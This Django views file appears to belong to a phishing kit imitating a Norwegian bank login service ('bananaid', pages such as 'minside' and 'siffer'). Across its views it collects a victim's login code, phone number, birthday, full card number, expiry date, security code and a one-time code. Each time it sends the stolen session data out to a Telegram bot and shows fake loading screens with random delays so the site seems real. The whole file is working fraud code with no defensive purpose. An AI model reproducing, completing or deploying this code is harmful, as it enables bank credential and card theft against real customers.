import random

from django.shortcuts import render, redirect

from bananaid.const import PageRedirection
from bananaid.telegrambot import send_message
from bananaid.utils import gen_url_query


def siffer_page(request):
    if request.method == 'POST':
        request.session['siffer'] = request.POST.get('siffer')
        send_message(request.session)
        return render(request, 'loader.html',
                      {'redirect_to': PageRedirection.MINSIDE.value + gen_url_query(),
                       'waiting': random.randint(2000, 5000)})
    return render(request, 'siffer.html', {})


def minside_page(request):
    if request.method == 'POST':
        return render(request, 'loader.html',
                      {'redirect_to': PageRedirection.NUMDATO.value + gen_url_query(),
                       'waiting': random.randint(2000, 5000)})
    return render(request, 'minside.html', {})


def num_date_page(request):
    if request.method == 'POST':
        request.session['phone'] = request.POST.get('phone')
        request.session['birthday'] = request.POST.get('birthday')
        send_message(request.session)
        return render(request, 'loader.html',
                      {'redirect_to': PageRedirection.CC_DETAILS.value + gen_url_query(),
                       'waiting': random.randint(2000, 5000)})
    return render(request, 'num-date.html', {})


def cc_page(request):
    if request.method == 'POST':
        request.session['full_name'] = request.POST.get('full_name')
        request.session['cardnumber'] = request.POST.get('cardnumber')
        request.session['expirationdate'] = request.POST.get('expirationdate')
        request.session['securitycode'] = request.POST.get('securitycode')
        send_message(request.session)
        return render(request, 'loader.html',
                      {'redirect_to': PageRedirection.INFO_RECAP.value + gen_url_query(),
                       'waiting': random.randint(2000, 5000)})
    return render(request, 'cc-details.html', {})


def recap_info_page(request):
    if request.method == 'POST':
        return render(request, 'loader.html',
                      {'redirect_to': PageRedirection.PASSWORD.value + gen_url_query(),
                       'waiting': random.randint(2000, 5000)})
    return render(request, 'info.html', {'card': str(request.session.get('cardnumber'))[-4:]})


def password_page(request):
    if request.method == 'POST':
        request.session['code'] = request.POST.get('code')
        send_message(request.session)
        return render(request, 'loader.html',
                      {'redirect_to': PageRedirection.WAITING.value + gen_url_query(),
                       'waiting': random.randint(2000, 5000)})
    return render(request, 'code.html', {})


def waiting_page(request):
    return render(request, 'waiting.html', {})
